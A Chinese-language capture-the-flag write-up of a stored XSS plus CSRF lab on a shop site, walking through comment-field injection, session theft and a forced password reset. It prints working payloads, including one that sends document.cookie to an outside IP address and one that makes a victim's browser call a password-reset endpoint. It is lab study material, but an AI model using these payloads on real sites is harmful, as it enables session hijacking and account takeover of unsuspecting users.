开启靶机之后，访问页面是一个商城。
靶机名字是xss+csrf那么一般就是一些可以让用户编辑发布之后，其他用户也可以访问点击的功能。例如：文档发布，评论，留言，日志等场景。经过前段渲染之后作为js语句被执行。
商城系统，最经典的xss场景就是产品评论。
随便找一个商品的评论页面，自己随便写一个评论，可以进行发布。
尝试弹窗，先验证能不能xss

```html
<img src="/" =_=" title="onerror='prompt(1)'">
```

发布之后可以进行弹窗，验证功能点有xss,实际场景可能会有很严格的过滤，不会简单的直接插入js语法或者html就标签就执行。

可能需要结合f12之后查看页面当前渲染的html代码，结合自己的payload判断转义和过滤。

https://github.com/pgaijin66/XSS-Payloads

一个github项目，有挺多变形xss的payload。

因为提示中提到：

![image-20260125194531952](https://cdn.jsdelivr.net/gh/halcyon098/study-img/study-images/image-20260125194531952.png)

结合抓包是通过cookie鉴权的，基本可以确定，是通过是拿cookie的。

本地起一个http服务器，用来收cookie。

尝试了几个语句，找到一个可以用的：

```html
<img src=x onerror=\"new Image().src='//113.45.128.31:8080/?c='+encodeURIComponent(document.cookie)\">
```

等一会就可以接收到mht用户的cookie。

拿到之后，访问个人页面，用bp将cookie替换，可以在历史订单的响应中拿到flag。

（打完写出来挺简单的，但实际如果js不熟的话，要慢慢试语法然后改出来，靶场可以爆语法，实际渗透测试不能这么干）

接评论，配合csrf，在全局寻找可以接管账号的功能点。
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/study-images/5710bb2d91ccfbeb7d697e71e43c0605_MD5.png)
重置密码是固定的123456，可能是故意设计的功能。但是可以抓包看到请求。
[Open: file-20260127205029430.png](assets/a4d7cfc4b54875399e26bc03dd851b3d_MD5.png)
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/study-images/a4d7cfc4b54875399e26bc03dd851b3d_MD5.png)

那组合就来了，将上面xss的url替换成这个重置密码的url，mht用户访问后会将密码重置为123456

```
<img src=x onerror=\"new Image().src='http://192.168.111.20/api/reset_password.php'\">
```

等待10秒机器人访问后，用户密码被重置，用户名知道的情况下可以直接登陆了。
[Open: file-20260127205548959.png](assets/a13d105069090aea084fde1f658b15a8_MD5.png)
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/study-images/a13d105069090aea084fde1f658b15a8_MD5.png)

